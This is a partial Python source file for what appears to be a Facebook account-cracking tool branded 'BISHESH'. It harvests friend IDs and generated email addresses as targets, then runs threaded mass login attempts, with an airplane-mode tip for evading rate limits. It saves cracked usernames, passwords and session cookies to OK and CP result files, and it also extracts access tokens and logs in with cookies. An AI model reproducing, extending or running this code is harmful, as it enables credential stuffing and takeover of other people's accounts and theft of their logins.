...
\033[1;36m            ╔╗ ╦╔═╗╦ ╦╔═╗╔═╗╦ ╦
            ╠╩╗║╚═╗╠═╣║╣ ╚═╗╠═╣
   \033[1;37m         ╚═╝╩╚═╝╩ ╩╚═╝╚═╝╩ ╩\033[1;37m「\033[1;36mv•2\033[1;37m」""")
    ...
    def ApkActive(self, url, cookie):
        try:
            ...
            for x in resp['data']['node']['activeApps']['edges']:
                ...
                active.append("Application {}{} {}Status {}".format(DT,HU,xx['app_name'],DT,HU,xx['app_status']))
    ...
    def ApkExpired(self, url, cookie):
        try:
            ...
            for x in resp['data']['node']['expiredApps']['edges']:
                ...
                inactive.append("Application {}{} {}Status {}".format(DT,ME,xx['app_name'],DT,ME,xx['app_status']))
        except AttributeError as e: print(e)
           
    def Display(self,xxx,passwd,cookie):
        ...
        true = tree.add(f'\r╭ Related Active Applications',style='green')
        if len(active)==0: true.add('No related active applications')
        for apk in active: true.add(f"{apk}")
        try: self.ApkExpired('https://web.facebook.com/settings/?tab=applications', cookie)
        except Exception as e: pass
        true = tree.add(f'\r╭ Related Inactive Applications',style='red')
        if len(inactive)==0: true.add('No related inactive applications')
...
def setup_user_data():
    ...
    create_file_if_not_exists("data/name.xml")
    create_file_if_not_exists("data/password.xml")
    ...
    uname = get_user_input("data/name.xml", f"  {c}     「{r}•{c}」{r}  Enter your name »")
    upass = get_user_input("data/password.xml", f" {c}     「{r}•{c}」{r}   Enter your password » ")

setup_user_data()


def get_user_name():
    with open("data/name.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_password():
    with open("data/password.xml", "r") as file_obj:
        return file_obj.readline().strip()
...
def ip():
    ...
    try:
        ...
        sp = " "
    print(f"\n    {c} 「{r} Status{c} 」{r}  » {c}" + bn)
    print(f"   {c} 「{r} Name{c} 」{r}  » {c}{user_name}" )
    print(f"   {c} 「{r} Pass{c} 」{r}  » {c}{user_password}" )
    print(f"    {c} 「{r} Your IP{c} 」 {r} » {c}" + ip)
    print(f"    {c} 「{r} Country{c} 」 {r} » {c}" + ng)
    print(f"    {c} 「{r} Country Code{c} 」 {r} » {c}" + cc)
    print(f"    {c} 「{r} Region{c} 」 {r} » {c}" + pr)
    print(f"    {c} 「{r} City{c} 」 {r} » {c}" + kt)
    ####print("Postal Code: " + kb)
    print(f"    {c} 「{r} Timezone{c} 」 {r} » {c}" + tz)
    print(f"    {c}「{r} Provider{c} 」{r}  » {c}" + sp)
    ##print("    {c}「{r} More Info{c} 」 »{c} http://ip-api.com/#" + ip)
...
def menu(): 
    ...
    #ban()
    greet_user()
    print(f"""{c}     「{r}1{c}」{r} PUBLIC       {c}    「{r}4{c}」{r} TOOLS""")
    print(f"""{c}     「{r}2{c}」{r} FILE         {c}    「{r}5{c}」{r} SETTINGS""")
    print(f"""{c}     「{r}3{c}」{r} GET TOKEN      {c}  「{r}6{c}」{r} MY DETAILS""")
    print(f"""{c}     「{r}0{c}」{r} EXIT           {c}  「{r}7{c}」{r} LOG OUT""")
    
    Bishesh_choice = input(f'   {c}「{r}Choose {c}」{r}»  ')
    if Bishesh_choice in ['1']:
        Facebook()
    elif Bishesh_choice in ['2']:
        fileopt()
    elif Bishesh_choice in ['3','03']:
        EAAY()
        
    elif Bishesh_choice in ['4','04']:
        ask()
        
     
        
        #restart()
    elif Bishesh_choice in ['5','05']:
        contact()
    elif Bishesh_choice in ['0']:
        ask2()
        
        
        print(' 「✓」 DONE LOGOUT ')
        exit()
    elif Bishesh_choice in ['6']:
        ip()
    elif Bishesh_choice in ['7']:
        groups()
    else:
...
def animate_text(text, delay=0.1):
    print("\033[96m" + "\033[0m" + "\033[96m".join(text), end='', flush=True)
    time.sleep(0.1)
    print("\033[0m", end='', flush=True)  # Reset color after animation

def EAAY():
    animate_text("      To acquire a token, it's  necessary to \nprovide your identification and password.\n")
    username = input(f'{c}   「{r}ID {c}」{r}»     \033[0m')
    password = input(f'   {c}「{r}Password{c}」{r}» \033[0m')
    ...
    if 'access_token' in responses:
        print("\033[91m" + responses['access_token'] + "\033[0m")  # Dark red color for access token
    else:
        print(responses['error_msg'])

def groups():
    print(f"This service will be available soon")
...
class Facebook:
    ...
    def chek_info(self,cookie,token):
        try:
            ...
            input(f'\n {DT}「{ME}!{DT}」 your sacrifice is expired, enter to return'); self.deled_dst()
            
    def login_cookie(self):
        self.clear_terminal()
        cok = input(f' {DT}「{c}?{DT}」 cookie facebook ')
        while True:
            try:
                self.canda_bang(cok)
                ...
                print(f' {DT}「{c}•{DT}」token facebook {tok}')
                with open('.data_fb.txt',mode='w') as wr:
                    wr.write(f'{cok}|{tok}')
                    wr.close()
                input(f' {DT}「{c}!{DT}」 login successful, enter to go to the menu')
                self.chek_data()
                break
            except AttributeError as e: #print(e)
                self.deled_dst()
 ...
 {c}    「{r}Your Uid{c}」 » {c}{id}
 {c}    「{r}Name{c}」     » {c}{name}''')
        print(f"""{r}     「{c}1{r}」{r} Crack id From Friends""")
        print(f"""{r}     「{c}2{r}」{r} Clone random email""")
        print(f"""{r}     「{c}3{r}」{r} Check result ok/cp""")
        print(f"""{r}     「{c}!{r}」{ME} Log {r}or Out""")

        ch = input(f'  {c}「{r}Choose {c}」{r}»  ')               
        if ch in ('1','01'):
            print(f'\n {DT}  「{c}•{DT}」 Number of IDs, separate them with commas')
            user = input(f' {DT}  「{c}?{DT}」 ID » ')
            ...
            print(f'\n {DT}「{c}•{DT}」 Number of Names, separate with commas')
            user = input(f' {DT}「{c}?{DT}」 Name » ')
            total = input(f' {DT}「{c}?{DT}」 Total dump » ')
            print(f'\n {DT}「{c}•{DT}」The number of domains, separate them with commas')
            print(f' {DT}「{c}•{DT}」 Domain Example :({HU}@gmail.com, @yahoo.com {DT}and others)')
            doma = input(f' {DT}「{c}?{DT}」 Domain» ').split(',')
            ...
            print(f'''
 {r}        「{c}1{r}」 Check OK Results
 {r}        「{c}2{r}」 Chek  CP Results\n''')
            xxx = input(f' {r}「{c}?{r}」Choose  »')
            try: print(); self.Result(xxx)
            except Exception as e: print(f' {DT}「{ME}!{DT}」    file not found, please check first'); exit()
    ...
    def Result(self, result):
        if result in ('1','01'):
            for buka in open(f'/sdcard/OK/ok-'+str(self.alt)).readlines():
                try: tree = Tree(f'\r╭ logged in user',style='green'); true = tree.add(f"Username {buka.split('|')[0]}"); true.add(f"Password {buka.split('|')[1]}"); true = tree.add(f"Cookie {buka.split('|')[2]}"); tree.add("Success check in Result OK"); printz(tree)
            ...
            for buka in open(f'/sdcard/CP/cp-'+str(self.alt)).readlines():
                try: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f"Username {buka.split('|')[0]}"); true.add(f"Password {buka.split('|')[1]}"); tree.add("Success check in Result CP"); printz(tree)
                except Exception: tree = Tree(f'\r╭ logged in checkpoint',style='yellow'); true = tree.add(f"Username {buka.split('|')[0]}"); true.add(f"Password {buka.split('|')[1]}"); tree.add("Success check in Result CP"); printz(tree)
        ...
        try:
           ...
           for x in res['friends']['data']:
               if x not in dump:
                   ...
                   print(f' {DT}「{c}•{DT}」 It is dumping {c}{len(dump)} {DT}idz',flush=True,end=('\r'))
    ...
    def dump_email(self,nama,total,doma):
        ...
        with excutor(max_workers=5):
            for i in range(int(total)):
                ...
                print(f' {DT}    「{c}•{DT}」Dumpingg {HU}{len(dump)} {DT}email',flush=True,end=('\r'))
            if int(len(dump)) == total: return(int(total))
        return dump
        
    def Methode(self):
        print('\n    ')
        cyud = input(f' {DT}   「{c}?{DT}」Want to show application (y/n): ')
        if cyud in ('y','ya'): self.opsi.append('muncul')
        self.exec_kntl()       
        
    def exec_kntl(self):
        print(f'''
 {DT}    「{c}•{DT}」Result OK : OK/ok-{self.alt}
 {DT}    「{c}•{DT}」Result CP : CP/cp-{self.alt}\n''')
        print(f' {DT}   「{ME}!{DT}」 Play Airplane Mode Every 200 Loops\n')
        with excutor(max_workers=30) as V:
            ...
            if self.ok ==0 and self.cp ==0:
                exit(f' {DT}    「{ME}!{DT}」 Sorry, you did not get the results')
            else:
                print(f'''
 {DT}    「{c}•{DT}」Result OK : {self.ok}
 {DT}    「{c}•{DT}」 Result CP : {self.cp}'''); exit()
                
    def ExecReg(self, username, password):
        byps = requests.Session()
        print(f' {DT}「「{ME}{self.lp}/{len(dump)}{DT}」Live : {HU}{self.ok}{DT} CP : {c}{self.cp}{DT}',flush=True,end=('\r'))
